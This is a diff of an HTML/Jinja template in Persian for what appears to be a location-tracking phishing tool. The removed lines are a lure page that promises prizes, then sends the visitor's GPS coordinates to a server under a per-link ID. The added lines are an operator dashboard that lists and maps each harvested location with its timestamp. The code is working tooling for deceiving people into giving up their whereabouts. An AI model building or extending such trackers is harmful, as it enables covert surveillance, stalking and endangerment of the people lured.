@@ -1,171 +1,96 @@
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
-
 <head>
-
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dashboard Map</title>
 
-<title>Make a request and get a chance to win a prize | Location Share</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css">
 
-<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+<style>
+body{
+    margin:0;
+    font-family:tahoma;
+    background:#111;
+    color:white;
+}
+
+h2{
+    text-align:center;
+    padding:15px;
+}
+
+#map{
+    width:100%;
+    height:75vh;
+}
+
+.info{
+    padding:15px;
+}
+</style>
 
 </head>
 
-
 <body>
 
+<h2>📍 داشبورد موقعیت‌ها</h2>
 
-<div class="container">
-
-
-<div class="card">
-
-<h1>
-⚡ RAYYSE OFFLINE
-</h1>
-
-
-<h2>
-اشتراک موقعیت
-</h2>
-
-
-<p>
-برای ارسال موقعیت، اجازه دسترسی به موقعیت مکانی خود را فعال کنید.
-</p>
-
+<div id="map"></div>
 
 <div class="info">
 
-برای دریافت جوایز کلیمه ریز را کلیک کتید 🥰👇🏻.
+{% for loc in locations %}
+
+<p>
+🔗 لینک: {{loc.id}} <br>
+🌍 Latitude: {{loc.lat}} <br>
+🌍 Longitude: {{loc.lng}} <br>
+⏰ زمان: {{loc.time}}
+</p>
+
+<hr>
+
+{% endfor %}
 
 </div>
 
 
-<button onclick="sendLocation()">
-
-📍 اشتراک موقعیت
-
-</button>
-
-
-<div id="result">
-
-منتظر اجازه شما هستیم...
-
-</div>
-
-
-</div>
-
-
-</div>
-
+<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
 
 
 <script>
 
-function sendLocation(){
+var map = L.map('map').setView([34.5553,69.2075],6);
 
 
-let result =
-document.getElementById("result");
-
-
-result.innerHTML =
-"📡 در حال بررسی اجازه موقعیت...";
-
-
-
-if(navigator.geolocation){
-
-
-navigator.geolocation.getCurrentPosition(
-
-function(position){
-
-
-let lat =
-position.coords.latitude;
-
-
-let lng =
-position.coords.longitude;
-
-
-
-fetch("/send_location/{{link_id}}",{
-
-
-method:"POST",
-
-
-headers:{
-
-"Content-Type":
-"application/json"
-
-},
-
-
-body:JSON.stringify({
-
-lat:lat,
-
-lng:lng
-
-})
-
-
-})
-
-.then(()=>{
-
-
-result.innerHTML =
-"✅ موقعیت با موفقیت ارسال شد";
-
-
-});
-
-
-
-},
-
-
-function(){
-
-
-result.innerHTML =
-"❌ اجازه موقعیت داده نشد";
-
-
+L.tileLayer(
+'https://tile.openstreetmap.org/{z}/{x}/{y}.png',
+{
+maxZoom:19,
+attribution:'© OpenStreetMap'
 }
+).addTo(map);
 
 
 
+{% for loc in locations %}
+
+L.marker([
+{{loc.lat}},
+{{loc.lng}}
+])
+.addTo(map)
+.bindPopup(
+"📍 لینک: {{loc.id}}<br>"+
+"⏰ {{loc.time}}"
 );
 
 
-}
-
-else{
-
-
-result.innerHTML =
-"مرورگر شما از موقعیت پشتیبانی نمی‌کند";
-
-
-}
-
-
-}
+{% endfor %}
 
 
 </script>
 
 
 </body>
-
 </html>
